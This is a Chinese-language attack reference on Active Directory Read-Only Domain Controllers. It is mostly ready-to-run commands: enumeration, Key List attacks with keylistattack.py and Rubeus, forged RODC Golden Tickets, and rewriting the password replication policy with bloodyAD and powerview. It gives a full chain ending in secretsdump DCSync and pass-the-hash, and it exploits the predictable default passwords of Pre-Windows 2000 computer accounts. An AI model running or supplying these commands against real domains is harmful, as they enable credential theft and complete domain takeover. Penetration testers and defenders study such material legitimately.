# RODC 攻击完整参考

只读域控制器 (Read-Only Domain Controller) 攻击面与利用技术详解。

---

## RODC 概念与攻击面

### RODC 基本特征

- 只读 AD 数据库副本，不可直接写入
- 拥有独立的 krbtgt 密钥: `krbtgt_XXXXX` (X 为数字编号)
- 密钥编号存储在 `msDS-SecondaryKrbTgtNumber` 属性中
- 通过密码复制策略 (PRP) 控制缓存哪些账户的密钥
- `managedBy` 属性指定 RODC 管理者 (通常为分支机构 IT)

### 密码复制策略 (PRP)

| 属性 | 含义 | 默认值 |
|------|------|--------|
| msDS-RevealOnDemandGroup | 允许缓存的账户/组 (Allowed List) | Allowed RODC Password Replication Group |
| msDS-NeverRevealGroup | 拒绝缓存的账户/组 (Denied List) | Denied RODC Password Replication Group, Domain Admins, Enterprise Admins 等 |

- Denied List 优先级高于 Allowed List
- 默认 Denied List 包含所有高权限组

### 枚举 RODC

```bash
# LDAP 查询 — primaryGroupID=521 为 RODC 的 primary group
ldapsearch -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASSWORD" \
  -b "DC=$DOMAIN_DN" "(primaryGroupID=521)" \
  dn sAMAccountName msDS-SecondaryKrbTgtNumber msDS-RevealOnDemandGroup msDS-NeverRevealGroup managedBy

# netexec 模块
nxc ldap $DC_IP -u "$USER" -p "$PASSWORD" -M rodc
```

```powershell
# PowerShell
Get-ADDomainController -Filter { IsReadOnly -eq $true } | Select-Object Name, Site, IPv4Address
Get-ADComputer -Filter { primaryGroupID -eq 521 } -Properties msDS-SecondaryKrbTgtNumber, msDS-RevealOnDemandGroup, msDS-NeverRevealGroup, managedBy
```

### 查询 PRP 详细信息

```powershell
# 查看允许列表成员
Get-ADGroupMember "Allowed RODC Password Replication Group"

# 查看拒绝列表成员
Get-ADGroupMember "Denied RODC Password Replication Group"

# 查看已缓存的账户
Get-ADDomainController -Identity $RODC_NAME | Get-ADRodcAuthenticatedNotRevealed
Get-ADDomainController -Identity $RODC_NAME | Get-ADRodcRevealed
```

```bash
# Linux — bloodyAD
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP get object "$RODC_DN" \
  --attr msDS-RevealOnDemandGroup msDS-NeverRevealGroup
```

---

## Key List 攻击

### 原理

RODC 使用 Key List Request 向可写 DC 请求账户密钥用于本地缓存。如果攻击者获取了 RODC 的 krbtgt 密钥，可以伪造 Key List Request 提取账户的 NT hash。

### keylistattack.py (Impacket)

```bash
# 完整模式 — 忽略 Denied List，提取所有可用密钥
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" \
  -full "$DOMAIN/$USER:$PASS"@"$RODC_FQDN"

# 正常模式 — 遵循 PRP 策略 (仅提取 Allowed List 中的)
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" \
  "$DOMAIN/$USER:$PASS"@"$RODC_FQDN"

# 指定用户模式
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" \
  -t "$TARGET_USER" "$DOMAIN/$USER:$PASS"@"$RODC_FQDN"

# 输出到文件
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" \
  -full "$DOMAIN/$USER:$PASS"@"$RODC_FQDN" -o keylist_hashes.txt
```

### Windows — Rubeus 两步法

```powershell
# Step 1: 伪造 RODC TGT
Rubeus.exe golden /rodcNumber:$KRBTGT_NUM /flags:forwardable,renewable,enc_pa_rep \
  /nowrap /outfile:rodc_tgt.kirbi \
  /aes256:$KRBTGT_AES /user:$USER /id:$USER_RID \
  /domain:$DOMAIN /sid:$DOMAIN_SID

# Step 2: 使用 TGT 发起 Key List Request
Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:rodc_tgt.kirbi \
  /service:krbtgt/$DOMAIN

# 针对特定用户
Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:rodc_tgt.kirbi \
  /service:krbtgt/$DOMAIN /user:$TARGET_USER
```

### 关键说明

- `-full` 模式会尝试提取 Denied List 中的账户，但可写 DC 可能拒绝
- 不带 `-full` 时遵循 PRP 策略，成功率更高但范围有限
- 提取的 hash 可直接用于 Pass-the-Hash 或 DCSync

---

## RODC Golden Ticket

### 伪造 RODC Golden Ticket

```powershell
# Rubeus — 伪造 RODC Golden Ticket
Rubeus.exe golden /rodcNumber:$KRBTGT_NUM \
  /flags:forwardable,renewable,enc_pa_rep \
  /nowrap /outfile:ticket.kirbi \
  /aes256:$KRBTGT_AES \
  /user:Administrator /id:500 \
  /domain:$DOMAIN /sid:$DOMAIN_SID
```

```bash
# Impacket ticketer
ticketer.py -nthash "$KRBTGT_NT" -aesKey "$KRBTGT_AES" \
  -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" \
  -user-id 500 Administrator
```

### kvno 字段要求

- RODC Golden Ticket 的 kvno 必须包含 RODC 编号信息
- 格式: kvno 高位包含 RODC number
- Rubeus `/rodcNumber` 参数自动处理此字段

### 票据验证流程

1. RODC Golden Ticket 提交到可写 DC
2. 可写 DC 发现票据由 RODC krbtgt 签发
3. 可写 DC 用自己的 krbtgt 密钥重新签名 PAC
4. 如果 PAC 中的用户在 Denied List 中，可写 DC 可能拒绝
5. 成功后返回正常 TGS，可用于访问服务

### 与普通 Golden Ticket 对比

| 特征 | 普通 Golden Ticket | RODC Golden Ticket |
|------|:------------------:|:------------------:|
| 所需密钥 | 主 krbtgt | RODC krbtgt_XXXXX |
| 获取难度 | 需要 DC admin | 需要 RODC admin |
| 受 PRP 限制 | 否 | 是 (Denied List) |
| 可写 DC 验证 | 直接接受 | 需重新签名 PAC |

---

## RODC DACL 利用

### 攻击前提

拥有对 RODC 计算机对象的写权限:
- GenericWrite
- WriteDacl
- GenericAll
- 或 managedBy 指向可控账户

### bloodyAD

```bash
# 添加 Domain Admins 到允许缓存列表
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP \
  set object "$RODC_DN" msDS-RevealOnDemandGroup \
  -v "CN=Domain Admins,CN=Users,DC=$DOMAIN_DN"

# 追加到允许列表 (不覆盖现有)
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP \
  set object "$RODC_DN" msDS-RevealOnDemandGroup \
  --append -v "CN=Target User,CN=Users,DC=$DOMAIN_DN"

# 清除拒绝列表 (移除 Denied List 中的所有条目)
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP \
  set object "$RODC_DN" msDS-NeverRevealGroup
```

### powerview.py

```python
# 追加到允许列表
Set-DomainObject -Identity "$RODC_DN" \
  -Append @{'msDS-RevealOnDemandGroup'='CN=Domain Admins,CN=Users,DC=$DOMAIN_DN'}

# 覆盖设置允许列表
Set-DomainObject -Identity "$RODC_DN" \
  -Set @{'msDS-RevealOnDemandGroup'='CN=Domain Admins,CN=Users,DC=$DOMAIN_DN'}

# 清除拒绝列表
Set-DomainObject -Identity "$RODC_DN" -Clear 'msDS-NeverRevealGroup'
```

### 完整攻击链

```
1. 修改 PRP (添加高权限账户到 Allowed List / 清除 Denied List)
      ↓
2. 导出 RODC 的 krbtgt_XXXXX 密钥
      ↓
3. 使用 RODC Golden Ticket
      ↓
4. Key List 攻击提取目标账户 NT hash
      ↓
5. Pass-the-Hash / DCSync
```

```bash
# 实战命令链
# Step 1: 修改 PRP
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP \
  set object "$RODC_DN" msDS-NeverRevealGroup
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP \
  set object "$RODC_DN" msDS-RevealOnDemandGroup \
  -v "CN=Domain Admins,CN=Users,DC=$DOMAIN_DN"

# Step 2: 导出 krbtgt (如果有 RODC 本地 admin)
secretsdump.py "$DOMAIN/$RODC_ADMIN:$PASS"@"$RODC_IP" -just-dc-user "krbtgt_$KRBTGT_NUM"

# Step 3-4: Key List 攻击
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" \
  -t "Administrator" "$DOMAIN/$USER:$PASS"@"$RODC_FQDN"

# Step 5: DCSync / PTH
secretsdump.py -hashes :"$ADMIN_NT" "$DOMAIN/Administrator"@"$DC_IP"
```

---

## Pre-Windows 2000 计算机账户

### 概念

Pre-Windows 2000 兼容模式创建的计算机账户使用可预测的默认密码: 小写的计算机名去掉 `$` 后缀。如果该账户从未更新过密码 (logonCount=0)，则仍使用此默认密码。

### 识别目标

```bash
# LDAP 筛选 — UAC=4128 (WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD) + logonCount=0
ldapsearch -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASSWORD" \
  -b "DC=$DOMAIN_DN" \
  "(&(userAccountControl=4128)(logonCount=0))" \
  sAMAccountName userAccountControl logonCount

# 提取计算机名并生成密码列表
# sAMAccountName: OLDPC01$ → password: oldpc01
```

```powershell
# PowerShell
Get-ADComputer -Filter { userAccountControl -band 4128 } -Properties logonCount |
  Where-Object { $_.logonCount -eq 0 } |
  Select-Object Name, sAMAccountName, logonCount
```

### 验证凭据

```bash
# 批量验证 — netexec
# computers.txt: 每行一个 sAMAccountName (带$)
# passwords.txt: 每行对应的小写名称 (不带$)
nxc smb $DC_IP -u computers.txt -p passwords.txt --no-bruteforce

# 单个验证
nxc smb $DC_IP -u 'OLDPC01$' -p 'oldpc01'
```

### 利用

```bash
# Kerberos 认证
getTGT.py "$DOMAIN/OLDPC01\$:oldpc01"

# 如果计算机账户在 RODC Allowed List 中
# 可结合 RODC 攻击链进一步利用

# 密码哈希获取
nxc smb $DC_IP -u 'OLDPC01$' -p 'oldpc01' --sam
```

### 与 RODC 攻击的结合

Pre-Windows 2000 计算机账户的可预测密码使 Timeroasting 更有效:

```
1. Timeroasting 获取计算机账户 SNTP hash
      ↓
2. 尝试 Pre-Windows 2000 默认密码破解
      ↓
3. 成功后检查该账户是否在 RODC Allowed List
      ↓
4. 如果在 Allowed List，结合 Key List 攻击扩大影响
```

### UAC 值说明

| UAC 值 | 含义 |
|--------|------|
| 4096 | WORKSTATION_TRUST_ACCOUNT |
| 32 | PASSWD_NOTREQD |
| 4128 | 4096 + 32 (Pre-Windows 2000 典型值) |
